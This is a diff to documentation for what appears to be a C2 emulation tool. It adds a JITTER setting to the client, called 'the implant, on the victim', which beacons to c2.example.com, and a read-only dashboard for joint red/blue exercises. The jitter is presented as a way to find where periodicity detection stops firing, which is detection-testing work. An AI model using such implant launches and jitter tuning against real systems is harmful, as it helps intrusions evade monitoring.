@@ -72,6 +72,17 @@ DASHBOARD=8787 sudo -E ./server/start-server.sh    # and an operator view on loo
 
 # the implant, on the victim
 PROXY=127.0.0.1:3128 ./client/start-client.sh c2.example.com
+JITTER=0.35 PROXY=127.0.0.1:3128 ./client/start-client.sh c2.example.com
+```
+
+`JITTER` spreads the reconnect period, which is how you find the jitter a
+periodicity detection stops firing at. The original has none, so it is a
+deviation and the client says so.
+
+For a joint exercise, add a second dashboard the other team cannot change:
+
+```
+DASHBOARD=8787 sudo -E ./server/start-server.sh --dashboard-view 8788
 ```
 
 Then drive traffic through the operator port, which speaks real RFC 1928:
